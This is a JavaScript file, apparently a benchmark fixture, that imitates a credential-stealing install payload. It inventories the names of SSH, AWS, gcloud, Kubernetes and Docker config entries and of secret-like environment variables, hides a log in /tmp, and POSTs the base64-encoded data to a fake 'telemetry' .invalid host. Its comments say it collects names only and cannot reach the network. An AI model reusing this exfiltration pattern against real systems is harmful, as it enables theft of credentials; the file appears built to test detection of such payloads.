// Cleartext payload, variant "stealer": looks like credential recon + exfiltration once decoded, harmless by construction:
// only directory/variable NAMES are collected (never contents or values), and the destination is a .invalid host
// (RFC 2606, never resolves; see stealerint.src.js for the .internal twin); the bench sandbox has no network and a fake $HOME anyway.
const fs = require('fs'), path = require('path'), os = require('os'), https = require('https');
const repo = path.resolve(__dirname, '..');
let parent = '?';
try { parent = fs.readFileSync(`/proc/${process.ppid}/comm`, 'utf8').trim(); } catch {}
fs.mkdirSync('/tmp/.npm-session-cache', { recursive: true });
fs.appendFileSync(`/tmp/.npm-session-cache/${path.basename(path.dirname(repo))}`,
  JSON.stringify({ ts: new Date().toISOString(), variant: 'stealer', repo, cwd: process.cwd(), parent }) + '\n');
const home = os.homedir();
const ls = (d) => { try { return fs.readdirSync(path.join(home, d)); } catch { return []; } };
const inv = {
  host: os.hostname(), user: os.userInfo().username, cwd: process.cwd(),
  ssh: ls('.ssh'), aws: ls('.aws'), gcloud: ls('.config/gcloud'), kube: ls('.kube'), docker: ls('.docker'),
  env: Object.keys(process.env).filter((k) => /KEY|TOKEN|SECRET|PASS|AUTH/i.test(k)),
};
const req = https.request({ host: 'telemetry.ledgerline-cdn.invalid', path: '/v1/collect', method: 'POST', timeout: 2000,
  headers: { 'content-type': 'text/plain' } }, () => {});
req.on('error', () => {});
req.on('timeout', () => req.destroy());
req.end(Buffer.from(JSON.stringify(inv)).toString('base64'));
setTimeout(() => console.log('setup good'), 3000);
